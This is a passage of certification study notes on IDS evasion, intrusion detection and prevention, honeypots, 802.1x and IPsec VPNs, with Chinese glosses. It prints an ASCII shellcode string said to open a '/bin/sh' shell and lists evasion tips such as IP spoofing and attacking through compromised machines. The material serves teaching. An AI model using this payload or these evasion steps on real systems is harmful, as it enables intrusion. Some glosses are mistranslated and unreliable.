byte of data next to the urgent data to be lost when urgent data is combined with normal data
     ▪


## Polymorphic Shellcode
Most IDSs contain signatures for commonly used strings
within shellcode
  - This is easily bypassed by using encoded shellcode
containing a stub that decodes the shellcode that
follows
  - This means that shellcode can be completely different
each time it is sent
Polymorphic shellcode allows attackers to hide their
shellcode by encrypting it in a simplistic form
  - It is difficult for IDSs to identify this data as shellcode This method also hides the commonly used strings within
shellcode, making shellcode signatures useless
ASCII Shellcode
Similar to polymorphic shellcode
  - ASCII shellcode contains only characters contained within the ASCII standard
This helps attackers bypass IDS pattern matching signatures
as strings are hidden within the shellcode in a similar fashion to polymorphic shellcode
The following is an ASCII shellcode example:
  - char shellcode[] =
  - "LLLLYhb0pLX5b0pLHSSPPWQPPaPWSUTBRDJfh5tDS"
       ▪


##   - "RajYX0Dka0TkafhN9fYf1Lkb0TkdjfY0Lkf0Tkgfh"   - "6rfYf1Lki0tkkh95h8Y1LkmjpY0Lkq0tkrh2wnuX1"   - "Dks0tkwjfX0Dkx0tkx0tkyCjnY0LkzC0TkzCCjtX0"   - "DkzC0tkzCj3X0Dkz0TkzC0tkzChjG3IY1LkzCCCC0"   - "tkzChpfcMX1DkzCCCC0tkzCh4pCnY1Lkz1TkzCCCC"   - "fhJGfXf1Dkzf1tkzCCjHX0DkzCCCCjvY0LkzCCCjd"   - “X0DkzC0TkzCjWX0Dkz0TkzCjdX0DkzCjXY0Lkz0tk"   - "zMdgvvn9F1r8F55h8pG9wnuvjrNfrVx2LGkG3IDpf"   - "cM2KgmnJGgbinYshdvD9d";
When executed, the shellcode above executes a "/bin/sh" shell
Encryption and Tunneling
When the attacker manages to establish an encrypted tunnel to the target, IDS-es are evaded completely
Any sort of encrypted connection/tunneling works   - SSH, SSL, IPSec, RDP, etc
Application Hijacking
If done correctly few HIDS will detect it, while NIDS usually skip the application layer completely
Application layer attacks enable many different forms of evasion
Many applications that deal with media such as images, video and audio employ some form of compression
When a flaw is found in these applications, the entire attack can occur within compressed data, and the IDS will have no
way to check the compressed file format for signatures
File Locations and Integrity Circumventing triggers in HIDS
       ▪


## to evade IDS during a Port Scan: Use fragmented IP packets
Spoof your IP address when launching attacks and sniff responses from the server
Use source routing (if possible)
Connect to proxy servers or compromised Trojaned
machines to launch attacks
Potential Solutions Normalization
  - Normalization takes obfuscated input and attempts to translate it into what the end host will eventually see
  - This usually entails encoding in formats such as Unicode and UTF8
  - The normalization process allows for encoding, translation and the application of pattern matching to the normalized data
  - Prevents obfuscating the attack strings using Unicode or UTF8 strings
  - Polymorphic shellcode & ASCII shellcode could circumvent this
  - Some IDSs are attempting to apply normalization to polymorphic shellcode
  - CPU intensive, which affects monitoring for the remaining network traffic
  - Normalization also applies to network data
  - Some IDSs normalize fragmented packets and
reassemble them in the proper order
  - This enables the IDS to look at the information just
     ▪


## as the end host will see it
  - In addition, some IDSs change the TTL field to a large
number
  - This ensures that packets reach the end host
Packet Interpretation Based on Target Host
  - IDS are at a disadvantage
  - These systems attempt to recreate what the end
host will see and handle
  - There are a lot of disparate methods of
communicating data over a network
  - The end host's TCP/IP stack should be used (host-
based IDS)
  - Better than trying to recreate the stream in a way
that the stream may be handled
  - In using the host to do the work, the guessing
portion of the task is eliminated
  - Another option: using modular TCP/IP stacks within an
IDS
  - Using the stacks based on the targeted host's operating system
  - Specific OS handling of anomalous traffic must be thoroughly reviewed
  - Effective in mitigating fragmentation, RST packet handling and Urgency Flags
Tools & Resources Some free IDS:
  - ACARM-ng - AIDE (Advanced Intrusion Detection Environment)
  - Bro NIDS - Fail2ban - OSSEC (Open Source Host- based IDS)
  - Prelude SIEM (Security Information & Event Management)
 ▪


##   - Samhain
  - Snort - Suricata
  - Tripwire
some IDS evasion tools:
  - Evader
  - Nmap
  - Nmap reference on IDS evasion
  - libemu
  - Kali Linux
  - Fragroute
  - Fragrouter   - InTrace
  - SniffJoke
  - Other tools
  - Wireshark - HxD (hex editor/viewer)
NIDS
traditional network intrusion detection system
Logical Target of Attacks
  - Each component a potential point of vulnerability and hence attacks
Possible Attacks on their
  - “Availability” (total shutdown)
  - “Accuracy” (false positives)
  - “Completeness” (false negatives)
Need to be Reliable, Robust
   ▪


##   - Avoid false sense of security
There’s no IDS out there with 100% accuracy
  - all generate both false positives and false negatives
- monitors activity on the network.
  - detects malicious signiture-based on traffic patterns and content.
  - not able to detect anomalies on individual systems / workstations unless the anomaly causes a significant difference in network traffic.
- can only monitor and assess threats from network nonencrypted traffic.
  - the only analysis it can perform is packet level analysis, since the application layer contents are inaccessible. Given that exploits against today's networks are primarily targeted against network services (application layer entities), packet level analysis ends up doing very little to protect our core business assets.
  - unable to decrypt encrypted traffic.
  - best way to evade the NIDS - Encryption
sits at the perimeter of a network
performing deep packet inspection on incoming and outgoing
traffic
applying a set of attack signatures or heuristics 探索法 to determine whether traffic patterns indicate malicious behavior.
     ▪


##  maintaining a database of attack signatures (regularly updated), or
rely on statistical analysis to establish a “baseline” of performance on the network, and signal an alert when network traffic deviates from this baseline.
network-based IDS reviews packets and headers, it can detect: denial of service (DoS) attacks
- teardrop attack SYN flood attack
DNS spoofing attack
Problems with NIDS
Passive Network Monitors
  - Inherently “fail-open”
  - Cease to provide protection when subverted 破坏
Vulnerability to Denial of Service
  - Process all flows to all protected end-systems
  - Being complex systems require lots of resources
  - Resource starvation problem is not easily solvable
Insufficient Information on the Wire
  - Not enough to correctly reconstruct the state of complex protocol transactions like it is done at the end-systems
Diversity in Protocol Implementations
  - Packet processing differs across end-systems
  - Leads to ambiguous interpretations Unknown Internal Network Conditions
  - Topology, router configs, traffic congestion, etc
Sensor and Collector Placement
       installs NIDS sensors / collectors on network devices (like routers, firewalls.)
Where to place the sensors depends on what you want to measure. E xample,
  - the sensor on the Internet side of the firewall will see all the traffic
  - the sensor on the internal side of the firewall will only see traffic passes through the firewall.
  - see both, put sensors in both places.
   - sensors are located before, after the firewall, and on routers.
  - These sensors collect and monitor network traffic on subnets
within the network and report to the NIDS console.
  - The NIDS provides overall monitoring and analysis and can
detect attacks on the network.
  - Figure 4.1 also shows a tap / port mirror on the internal ▪


## switch.
  - Most switches support port mirroring,
  - allowing administrators to configure the switch to send all traffic received by the switch to a single port.
  - After configuring a port mirror, you can use it as a tap to send all switch data to a sensor or collector, and forward this to a NIDS.
  - Similarly, it’s possible to configure taps on routers to capture all traffic sent through the switch and send it to the IDS.
protocol-based intrusion detection system (PIDS)
     ▪


## Specifically detecting malicious behaviors in a specific protocol usually deployed on a particular network host.
Example: a web server run PIDS to analyze incoming HTTP traffic, drop requests malicious or contain errors.
monitor application traffic between two hosts;
Example: traffic between a web server and a database might be inspected
for malformed database queries.
HIDS Host-based IDS
additional software installed on a single system (workstation, server..) ▪


##   - provides protection to the individual host
  - protects local resources on the host and can detect some malware that
isn’t detected by traditional antivirus software.
  - can detect attacks on local systems such as workstations and servers.
- monitor traffic, detect potential attacks, protect critical os files.
  - For a HIDS, this traffic passes through the network interface card
(NIC).
- monitoring audit files and system logs to detect:
  - masquerading / misfeasant users: attempt unauthorized actions
  - Masquerading 伪装 user: use heuristic rules or statistical analysis to detect when a user is deviating from “normal” behavior
  - Misfeasant 违法行为者 users: can be detected by a system that has rules defining authorized and unauthorized actions for each user.
  - clandestine 秘密的 users: delete or modify system monitoring.
  - can be detected by monitoring and logging how changes are made
to audit files and system logs themselves. monitors activity on that machine
  - like system calls, interprocess communication, and patterns in resource usage.
- Many HIDSs have expanded to monitor application activity on the system.
  - Example:
  - HIDS on different Internet-facing servers 2,732

  - (web, mail, database servers).
  - In addition to monitoring the network traffic reaching the servers, the
HIDS can also monitor the server applications.
- HIDS can help detect malicious software (malware) that traditional antivirus
software might miss.
  - Because of this, many organizations install a HIDS (beside traditional antivirus software) on every workstation as an extra layer of protection.
  - HIDS on a server: primarily to monitor network traffic
  - workstation HIDS: to monitor network traffic reach the workstation.
  - However, a HIDS can also monitor some applications and can protect
local resources such as operating system files. Administrators only install a HIDS when there’s a perceived need.
Example:
aspecific server with proprietary data is at increased risk of an attack install a HIDS on this system as an extra layer of protection.
Passive IDSs:
log potentially malicious events
alert the network administrator so that action can be taken.
They don’t take any preemptive actions 先发制人的on their own.
intrusion prevention systems (IPS):
more sophisticated reactive systems
work in conjunction with firewalls and other network devices to mitigate the malicious activity directly.
Example, an IPS may detect patterns suggesting a DOS attack, and automatically update the firewall ruleset to drop all traffic from the malicious party’s IP address. ][
The most commonly used IPS: Snort, employs both signature-based detection as well as heuristics.
Company use cloud-based service that requires mutual, certificate- based authentication with its users.
The company uses SSL-inspecting IDS at its network boundary. To prevent the IDS from capturing
  - the confidentiality of the mutual authentication.
  - credentials used to authenticate users to the new service
  - keys to decrypt that communication
 Use of active directory federation between the company and the cloud-based service
IPS Versus IDS—Inline vs Passive
Intrusion prevention systems (IPSs):
- are an extension of IDSs.
- also have a HIPS and a NIPS, NIPS is more common.
- distinctions of an IPS when compared with an IDS:
  - IPS: can detect, react, and prevent attacks.
  - IDS: monitors and will respond after detecting an attack, but it doesn’t
prevent them.
  - IPS: inline / in-band with the traffic. all traffic passes through the IPS and the IPS can block malicious traffic.
  - IDS:passive / out-of-band, monitors the network traffic, but the traffic doesn’t go through the IDS.
Most IDSs will only respond by raising alerts.
- Example:
- an IDS will log the attack and send a notification.
  - email, text message, pop-up window, or a notification on a central monitor.
Some IDSs have additional capabilities allowing them to change the environment in addition to sending a notification.
Example:
an IDS might be able to modify access control lists (ACLs) on firewalls to block offending traffic, close processes on a system that were caused by the attack, or divert the attack to a safe environment, such as a honeypot or honeynet (discussed later in this chapter).
While this is sometimes referred to as an active IDS, this phrase can be misleading.
As a reminder from the introduction of this section, both IDSs and IPSs have protocol analyzer capabilities. This allows them to monitor data streams looking for malicious behavior.
IPS: inspect packets within these data streams and block malicious packets before they enter the network.
  - The inline configuration of the IPS allows an IPS to prevent attacks from reaching the internal network.
NIDS: has sensors or data collectors that monitor and report the traffic.
  - An active NIDS can take steps to block an attack, but only after the attack has started.  Figure 4.2: NIPS used to detect and prevent attacks
Example: two network-based IPSs (NIPS 1 and NIPS 2).
All Internet traffic flows through NIPS 1,inspect incoming traffic.
NIPS 1 protects the internal network by detecting malicious traffic and preventing attacks fromreaching the internal network.
NIPS 2 is protecting an internal private network.
  - The firewall next to NIPS 2 can have rules that allow traffic from Homer’s computer into thenetwork, but block all other traffic. NIPS 2 will then inspect all the incoming traffic and block malicious traffic.
This might seem like overkill, but many advanced persistent threats (APTs) have successfully installed Remote Access Trojans (RATs) onto internal systems through phishing or malware attacks.
  - Once the RAT is installed, attackers can attack from within.
  - If an attacker began launching attacks on the private network from
Homer’s system, the firewall wouldn’t block it.
  - However, the NIPS will prevent this attack from reaching the private network.
each IPS is placed on the edge of the protected network.
  - Ensures NIPS can inspect all traffic going into the network. SDN Software-defined networking
a relatively recent trend.
uses virtualization technologies to route traffic instead of using hardware routers and switches. It separates the data and control planes.
can be use in placing security devices and in segmenting the network. Essentially in an SDN, the entire network is virtualized.
  - Allows easy segmentation of the network
  - allows the administrator to place virtualized security devices in any place
wishes.
uses virtualization technologies to route traffic instead of using hardware routers and switches.
SDN separates the data planes and control planes within a network.
  - the logic used to forward or block traffic (the data plane)
  - the logic used to identify the path to take (the control plane).
Hardware routers:
use rules in an ACL to identify whether forward or block traffic on the data
 a technology designed to simplify network infrastructure management plane.
This is always proprietary because it’s implemented on specific hardware routers.
SDN implements the data plane with software and virtualization technologies, allowing an organization to move away from proprietary hardware.
Routing protocols like Open Shortest Path First (OSPF) and Border Gateway Protocol (BGP) help routers determine the best path to route traffic on the control plane.
Routers use these protocols to share information with each other, creating a map of the known network.
SDN: can still use these routing protocols, but without the hardware routers.
the attribute-based access control (ABAC), which is commonly used in SDNs.
  - Instead of rules within ACLs, ABAC models allow administrators to create data plane policies to route traffic.
  - A huge benefit: use plain language statements, not complex rules in an ACL.
SSL/TLS Accelerators  - hardware devices
- focused on handling Transport Layer Security (TLS) traffic.
- TLS is the designated replacement for Secure Sockets Layer (SSL)
TLS provides encryption for many different protocols (like HTTPS).
- HTTPS uses a certificate and asymmetric encryption,
- The process of establishing the HTTPS session, negotiating the best security supported by both the client and the server, sharing encryption keys, and encrypting session data all take a lot of time and resources.
By off-loading this to another hardware device, it frees up the primary computer’s resources, such as CPU power and RAM.
- a web server, can off-load TLS traffic handling to the accelerator.
- When using an SSL accelerator: best to place it as close as possible to related
devices.
- Example
- using an SSL accelerator to off-load HTTPS sessions for a web server, place the SSL accelerator close to the web server. SSL Decryptors
Some organizations use SSL decryptors to combat many threats.
- Example:
- attackers often using encryption to prevent inspection methods from detecting malware coming into a network.
- imagine Homer innocently goes to a malicious web site. The web site establishes a secure HTTPS connection, and then downloads malware to Homer’s computer.
- Because the site is using HTTPS, the malware is encrypted while in transit.
- Even if an organization had the best content inspection methods and malware detection software, it wouldn’t detect the malware while it’s encrypted.
An SSL decryptor solves this problem.
- You would place it in the DMZ, and redirect all traffic to and from the
Internet through it.
- Unencrypted data goes through the device without any modification.
- However, any attempts to establish an encrypted session prompt the SSL decryptor to create a separate SSL (or TLS) session.
- Example:
- When Homer innocently goes to a malicious web site, the traffic goes though the SSL decryptor.
- The SSL decryptor establishes:
  - an HTTPS session between it and Homer’s computer.
  - It also establishes an HTTPS session between it and the web site.
- All data-in-transit is encrypted. However, the SSL decryptor can view the unencrypted data and inspect it.
SSL decryptors are often used with a NIPS. The NIPS is inline but malicious traffic can get through if it’s encrypted.
The SSL decryptor allows the NIPS to inspect unencrypted traffic and prevent attacks.
Honeypots
- a system set up as a decoy to entice attackers.
- a server left open or appears to have been sloppily locked down, allowing an attacker relatively easy access.
  - load it up with all sorts of fake goodies, with not-too-easy vulnerabilities a hacker may exploit.
Honeypots have two primary goals:
- Divert attackers from the live network:
  - An attacker would stumble upon your honeypot and spend all his time and effort there, leaving your real network, and resource, alone.
  - diverts the attacker away from the live network.
  - If an attacker is spending time in the honeypot, he is not
attacking live resources.
- Allow observation 注意 of an attacker:
  - While an attacker is in the honeypot, security professionals can observe the attack and learn from the attacker’s methodologies.
  - Honeypots can also help security professionals learn about zero-day exploits, or previously unknown attacks.
  - a system that is extensively monitored to learn what an attacker is attempting to do on the system.
  - A honey pot could be a UNIX system configured with a weak password.   - After an attacker logs in, surveillance 监视 software could log what the attacker does on the system.
  - This knowledge could then be used to protect real servers in the network.
Example:
- honeypot could be a web server designed to looklike a live web server, have bogus data such as files and folders containing fabricated credit card transaction data.
- If an organization suspects it has a problem with a malicious insider, it can create an internal honeypot with bogus information on proprietary projects.
Honeypots typically have minimal protection that an attacker can easily bypass.
- don’t use any security, the honeypot look suspicious to experienced attackers and they might simply avoid it.
design a honeypot will be hacked, two important points.
- First, anything and everything on a honeypot system is not to be
trusted.
  - Honeypots never hold any data that is valuable to the
organization:
  - The data may appear to be valuable to an attacker, but its disclosure is harmless.
  - Anything that has that many successful attacks against it could be riddled with loads of stuff you don’t even know about yet. prove useful to an attacker, and don’t trust anything you pull off it.
  - Granted, the information and resources have to look legitimate; just make sure they’re not.
- Second, location of the honeypot is of utmost importance.
  - You want this to be seen by the outside world, so you could place it outside the firewall. However, is that really going to fool anyone? Do you really believe a seasoned attacker is just going to accept the fact an administrator protected everything on the network, by putting everything behind a firewall, but just forgot this really important server on the outside?
  - A better, more realistic placement is inside the DMZ.
  - A hacker will discover pretty quickly where the firewall is, and placing a hard-to-find port backdoor to your honeypot is just the ticket to draw them in.
  - Wherever the honeypot winds up being located, it needs to be walled off to prevent it becoming a launching pad for further attacks.
often use honeypots as a tool to gather intelligence on the attacker.
- Attackers are constantly modifying their methods to take
advantage of different types of attacks.
- sophisticated attackers discover vulnerabilities before a patch is released (zero-dayexploit/vulnerability)
- security professionals observe attackers launching zero-day vulnerability attacks against a honeypot. vulnerability scans
- Nessus does a good job, during a scan, of identifying where a honeypot is located.
- Send-Safe Honeypot Hunter.
There are two types of honeypots.
- A high-interaction honeypot
  - 互動程度最高，牽涉到真正的作業系統與應用範圍，不只是模 擬環境
  - 駭客或惡意程可在這個蜜罐中存取任何資源，甚至是操縱系統
  - simulates all services and applications
  - is designed to be completely compromised.
  - Examples include Symantec, 引诱 Decoy Server, and Honeynets.
- A low-interaction honeypot
  - 低互動誘捕系統 (Low-Interaction Honeypot)
  - 互動程度最低，藉由模擬的方法，不會使內部的系統帶來額外 的風險，目 的是去監控特定服務是否受到攻擊
  - simulates a limited number of services
  - cannot be compromised completely (by design).
  - allow only limited interaction for an attacker or malware. All services offered by a Low Interaction Honeypots are emulated 竞争.
  - are not themselves vulnerable and will not become infected by the exploit attempted against the emulated vulnerability.   - will only give an attacker very limited access to the operating system. the adversary will not be able to interact with your decoy system in any depth, as it is a much more static environment.
  - will usually emulate a small amount of internet protocols and network services, just enough to deceive the attacker and no more. In general, most businesses simulate protocols such as TCP and IP, which allows the attacker to think they are connecting to a real system and not a honeypot environment.
  - is simple to deploy, does not give access to a real root shell, and does not use significant resources to maintain.
  - However, a low interaction honeypot may not be effective enough, as it is only the basic simulation of a machine. It may not fool attackers into engaging, and it’s certainly not in-depth enough to capture complex threats such as zero-day exploits.
  - Emulators of vulnerable programs
  - Easier to deploy and maintain
  - Tend to be used for production
  - More detectable
  - Examples of these include Specter 幽灵, Honeyd, and KFSensor.
- Of course, in the real world almost no one has the time, interest, or concern for installing and maintaining a honeypot. Most real hackers know they’re in one pretty quickly, and the payoff (that is, getting anything substantially useful out of it) is oftentimes nothing. But it is testable material, so learn what you must.
Honeynets
  - a group of honeypots within a separate network or zone, but accessible from an organization’s primary network.
  - security professionals often create honeynets using multiple virtual servers contained within a single physical server.
  - Honeypots: the servers within this network
  - Honeynet: mimics the functionality of a live network.   - Example:
  - You can use a single powerful server with a significant amount of RAM and processing power.
  - This server could host multiple virtual servers
  - each virtual server is running an operating system and
applications.
  - A physical server hosting six virtual servers will appear as seven systems on a subnet.
  - An attacker looking in will not be able to easily determine if the servers are physical orvirtual.
The purpose of this virtual network is to attract the attention of an attacker, just as a single honeypot tries to attract the attention of an attacker.
- If the attacker is in the honeynet, the live network isn’t being attacked, and administrators can observe the attacker’s actions. Pooh’s Paradise
Honeypots aren’t just to distract hackers; they’re also great at tracking down all sorts of information.
- Combine this knowledge with the absolute loathing worldwide of unsolicited e-mail and those who forward spam, groups of people might band their honeypots together in a coordinated effort to bring the spammers to a halt.
Project Honey Pot (https://www.projecthoneypot.org/about_us.php)
- a web-based network of honeypots
- using embedded software on various websites to collect information on spammers.
- The project collects IP addresses it catches harvesting email addresses for spam purposes. This information is shared among various law enforcement agencies to help combat private spammers worldwide. The information collected is also used in research and development of newer versions of the software to further improve the efforts of the group as a whole.
- From their site, it is “the first and only distributed system for identifying spammers and the spambots they use to scrape addresses from your website. - Using the Project Honey Pot system you can install addresses that are custom-tagged to the time and IP address of a visitor to your site. If one of these addresses begins receiving email we not only can tell that the messages are spam, but also the exact moment when the address was harvested and the IP address that gathered it.”
Another collaboration of effort is The Honeynet Project, founded in 1999.
- An international, non-profit (501c3) research organization dedicated to improving the security of the Internet at no cost to the public, The Honeypot Project raises awareness of threats and provides a “Know Your Enemy” series of papers.
- The project also provides security tools and techniques to help defeat cyberthreats. It now includes multiple active chapters around the world.
These collections, and others like them, demonstrate the good side of the Internet and networking altogether.
- Many open source projects like these are put together by well- meaning groups simply trying to make the world a better place. Pooh Bear, no doubt, would love them.
IEEE 802.1x Security
Another method of port security is to use IEEE 802.1x:
- a port-based authentication protocol.
- requires users or devices to authenticate when they connect to a specific wireless access point / physical port - can be implemented inboth wireless and wired networks.
- An 802.1x server provides strong port security using port-based
authentication.
- It prevents rogue devices from connecting to a network, ensure only authorized clients canconnect.
It secures the authentication process prior to a client gaining access to a network and blocks network access if the client cannot authenticate.
- 802.1x can use simple usernames / passwords, or certificates for certificate- based authentication.
- The 802.1x server prevents rogue devices from connecting to a network.
  - Consider open RJ- 45 wall jacks.
  - disabling them is a good port security practice
  - or can also configure an 802.1x server to require authentication for these ports.
  - If clients cannot authenticate, the 802.1x server blocks or restricts access to the network.
combine an 802.1x server with other network elements (like VLAN).
- Example
- provide visitors with Internet access, but prevent them from accessing internal network resources.
- You can configure the 802.1x server:
  - to grant full access to authorized clients,
  - redirect unauthorized clients to a guest area of the network via a VLAN.
You can implement 802.1x as a Remote Authentication Dial-In User Service (RADIUS) or Diameter server, helps authenticate virtual private network (VPN) clients before they connect.
You can also implement 802.1x in wireless networks to force wireless clients to authenticate before they connect. Virtual Private Networks
- Much of today’s workforce is separate.
- Some employees work in remote offices, while others telecommute. connect
to their main corporate network by using a variety of WAN technologies
(like leased lines and PVCs, found in Frame Relay and/or ATM networks).
- However, WAN technologies cost more than widely available broadband
technologies, like DSL and cable (can also offer faster speeds)
- Fortunately, virtual private networks (VPN) support secure communication
between two sites over an untrusted network (like the Internet)
- The two primary categories of VPNs are site-to-site and client-to-site:
◦ Site-to-site VPN:
▸ interconnects two sites, as an alternative to a leased line, at a reduced cost.
◦ Client-to-site VPN:
▸ client-to-site VPN/ remote-access VPN.
▸ interconnects a remote user with a site, as an alternative to dial-up or
ISDN connectivity, at a reduced cost.
- Although a VPN tunnel might physically pass through multiple service
provider routers, the tunnel appears to be a single router hop from the
perspective of the routers at each end of the tunnel.
- a client-to-site VPN allows a user, with software on their computer, to connect
to a centralized VPN termination device,
- a site-to-site VPN interconnects two sites without requiring any specialized
VPN software installed.   Overview of IPsec
- Broadband technologies, such as cable and DSL, in addition to other VPN transport mechanisms, often traverse an untrusted network, such as the Internet.
- Therefore, a primary concern with using a broadband technology as a VPN transport is security.
- Although different VPN technologies (like IPsec, GRE, L2TP, and L2F) offer a variety of features, IPsec VPNs offer strong security features.
- Specifically, IP security (IPsec) offers the following protections for VPN traffic:
◦ Data Confidentiality:
▸ provided by encrypting data.
▸ If a third-party intercepts the encrypted data, he would not be able to
interpret the data.
◦ Data Integrity:
▸ ensures that data is not modified in transit.
▸ Example, routers at each end of a tunnel can calculate a checksum
value or a hash value for the data, and if both routers calculate the same value, the data has most likely not been modified in transit.
◦ Data Authentication:
▸ allows parties involved in a conversation to verify that the other
party is the party they claim to be. ▸ IPsec operates at network Layer 3 of the OSI model.
- As a result, IPsec is transparent to applications, applications do
not require any sort of integrated IPsec support.
- IKE Modes and Phases
- IPsec uses a collection of protocols to provide its features.
- One of the primary protocols is Internet Key Exchange (IKE) protocol.
◦ IPsec provide encryption between authenticated peers using encryption keys (periodically changed)
◦ IKE allows an administrator to manually configure keys.
- IKE can use 3 modes of operation to set up a secure communicate path
between IPsec peers:
◦ Main mode:
▸ Main mode involves 3 exchanges of information between the IPsec peers.
▸ One peer (initiator) sends one or more proposals to the other peer (responder).
▸ The proposal(s) include:
- supported encryption and authentication protocols and key
lifetimes.
- indicate whether or not to use perfect forward secrecy (PFS).
◦ PFS makes sure that a session key remains secure.
◦ even if one of the private keys used to derive the session key
becomes compromised. ▸ The 3 main mode exchanges:
- Exchange #1:
◦ The responder selects a proposal it received from the
initiator.
- Exchange #2:
◦ Diffie-Hellman (DH) securely establishes a shared secret
key over the unsecured medium. - Exchange #3:
◦ An Internet Security Association and Key Management Protocol (ISAKMP) session is established.
◦ This secure session is then used to negotiate an IPsec session.
◦ Aggressive mode:
▸ more quickly achieves the same results of main mode, ▸ using only three packets.
 ▸ The initiator sends the first packet:
- contains all the information necessary to establish a security
association (SA)
- (an agreement between the two IPsec peers about the cryptographic parameters to be used in the ISAKMP session).
▸ The responder sends the second packet:
- contains the security parameters selected by the responder
◦ the proposal, keying material, and its ID.
- This second packet is also used by the responder to authenticate
the session.
▸ The initiator sends the third and final packet:
- finalizes the authentication of the ISAKMP session.
◦ Quick mode:
▸ Quick mode negotiates the parameters (the SA) for the IPsec session, ▸ and this negotiation occurs within the protection of an ISAKMP
session.
- The IKE modes reflect the 2 primary phases of establishing an IPsec tunnel.
- IKE Phase 1
◦ IKE Phase 1 tunnel (ISAKMP tunnel).
◦ using either main mode or aggressive mode,
◦ establish a secure ISAKMP session.
▸ the IPsec endpoints establish security association (SA) (The collection of parameters):
- transform sets (a collection of encryption and authentication protocols),
- hash methods,
- and other parameters needed
- to establish a secure ISAKMP session/tunnel (IKE Phase 1
tunnel).
◦ With IKE Phase 1, the SA is bidirectional双向的
▸ the same key exchange is used for data flowing across the tunnel in
either direction.
- IKE Phase 2
◦ IKE Phase 2 tunnel(IPsec tunnel)
◦ using the quick mode of parameter negotiation.
◦ occurs within the protection of an IKE Phase 1 tunnel
◦ IKE Phase 2 performs unidirectional SA negotiations. ▸ each data flow uses a separate key exchange.
- Establish IPsec tunnel, can use just IKE Phase 1 and Phase 2, IKE Phase 1.5
can be used.
◦ IKE Phase 1.5 uses the Extended Authentication (XAUTH) protocol to
perform user authentication of IPsec tunnels.
◦ Like Phase 2, IKE Phase 1.5 is performed within the protection of an IKE
Phase 1 tunnel.
◦ The user authentication provided by this phase adds an additional layer of
authentication for VPN clients.
◦ Also, parameters such as IP, WINS, and DNS server information can be
provided to a VPN client during this optional phase.
 - Authentication Header (AH) and Encapsulating Security Payload (ESP)
- IKE, establishes the IPsec tunnel,
- IPsec also relies on
◦ either the Authentication Header (AH) protocol (IP protocol number 51)
◦ or the Encapsulating Security Payload (ESP) protocol (IP protocol
number 50).
▸ Both offer origin authentication and integrity services ▸ ensure that IPsec peers are who they claim to be
▸ the data was not modified in transit.
- The main distinction is encryption support:
◦ ESP encrypts the original packet,
◦ AH does not offer any encryption.
◦ So ESP is far more popular on today’s networks. - Both can operate in one of two modes:
◦ Transport mode:
▸ Uses a packet’s original IP header
▸ Not adding an additional tunnel header (increasing a packet’s size
might cause an issue)
▸ Also is frequently used for client-to-site VPNs
- a PC running VPN client software connects back to a VPN termination device at a headquarters location.
◦ Tunnel mode:
▸ Unlike transport mode, tunnel mode encapsulates an entire packet. ▸ Then the encapsulated packet has a new header (an IPsec header). - has source and destination IP address of two VPN termination
devices at different sites.
▸ Therefore, tunnel mode is frequently used in an IPsec site-to-site
VPN.
◦ Transport mode allows the IP address of the IPsec peers to remain visible
during transit, use original packet’s IP header to route the packet.
- But, IPsec is often used in conjunction with the generic routing encapsulation (GRE) tunneling protocol.
◦ In such a scenario, the original IP packet is encapsulated inside of a GRE tunnel packet, adds a new GRE tunnel header.
◦ The GRE packet is then sent over an IPsec tunnel.
◦ Then even the IPsec tunnel were running in transport mode, the original
packet’s IP header is not visible. Instead, the GRE packet’s header
would be visible.
- One reason a GRE tunnel might be used with an IPsec tunnel is a limitation on
the part of IPsec. Specifically, an IPsec tunnel can only transmit unicast IP
packets.
- The challenge is that large enterprise networks might have a significant
amount of broadcast or multicast traffic (like routing protocol traffic).
- GRE can take any traffic type and encapsulate the traffic in a GRE tunnel
packet, which is a unicast IP packet that can then be sent over an IPsec
tunnel.
◦ example:
◦ Take a multicast packet used by a routing protocol.
◦ IPsec cannot directly transport the multicast packet.
◦ If the packet is first encapsulated by GRE,
◦ the GRE packet can then be sent over an IPsec tunnel,
◦ thereby securing the transmission of the multicast packet. The Five Steps in Setting Up and Tearing Down an IPsec
Site-to-Site VPN
- establishing, maintaining, and tearing down an IPsec site-to-site VPN consists of
- five primary steps:
◦ 1. PC1 sends traffic destined for PC2.
▸ R1 classifies the traffic as “interesting” traffic, which initiates the
creation of an IPsec tunnel.
◦ 2. R1 and R2 negotiate a security association (SA) used to form an IKE
Phase 1 tunnel (ISAKMP tunnel).
◦ 3. With the protection of the IKE Phase 1 tunnel, an IKE Phase 2
tunnel(IPsec tunnel) is negotiated and set up.
◦ 4. After established the IPsec tunnel, interesting traffic (like traffic
classified by an ACL) flows through the protected IPsec tunnel.
▸ traffic not deemed interesting can still be sent between PC1 and PC2.
- However, transmitted outside the IPsec tunnel.
◦ 5. After no interesting traffic is seen for a specified amount of time, or the
IPsec SA is deleted, the IPsec tunnel is torn down.
- Although the previous example described an IPsec site-to-site VPN, the procedure is similar for a client-to-site VPN.  Other VPN Technologies
- IPsec VPNs are popular for securely interconnecting sites/connecting a remote client to a site
- Some other VPN protocols:
◦ SSL (1995)
▸ Secure Sockets Layer (SSL)
▸ provides cryptography and reliability for upper layers (Layers 5–7)
of the OSI model.
▸ has largely been replaced by Transport Layer Security (TLS).
▸ recent versions of SSL (like SSL 3.3) have been enhanced to be more
comparable with TLS.
◦ TLS ▸ has largely replaced SSL
▸ providing cryptography and reliability to upper layers of the OSI
model.
▸ Example: when securely connect to a website using HTTPS, its
probably using TLS.
◦ Both SSL and TLS provide secure web browsing via Hypertext Transfer
Protocol Secure (HTTPS).
◦ L2TP
▸ Layer 2 Tunneling Protocol (L2TP)
▸ lacks security features, like encryption.
▸ But can use for a secure VPN connection, if combined with another
protocol provide encryption.
◦ L2F
▸ Layer 2 Forwarding (L2F)
▸ lacks native security features.
▸ designed by Cisco Systems
▸ providing a tunneling protocol for PPP.
◦ PPTP - older VPN protocol
▸ Point-to-Point Tunneling Protocol (PPTP)
▸ supported the dial-up networking feature in older versions of
Microsoft Windows.
▸ lacks native security features.
▸ However, Microsoft’s versions of PPTP bundled with various
versions of Microsoft Windows® were enhanced to offer security features. Secure Systems (New S+ ch5)
advanced persistent threats (APTs) Any sophisticated series of related attacks taking place over an extended period of time.
Agile development A method of software development meant to be rapid.
baselining Creating a fundamental, or baseline, security level.
Big Data Data that is larger than what can be handled with traditional tools and algorithms.
database normalization The process of removing duplication in a relational database. embedded system Operating system in a device, sometimes on a single chip.
fuzzing A method of testing that intentionally enters invalid input to see if the applica- tion can handle it.
hardening The process of making a server or an application resistant to an attack. Infrastructure as Code (IaC) The process of managing and provisioning computer data-
centers through machine-readable definition files.
Internet of Things (IoT) Devices that interact on the Internet, without human intervention.
NoSQL database Datastores that do not use a relational structure.
Open Web Application Security Project (OWASP) An online community that develops
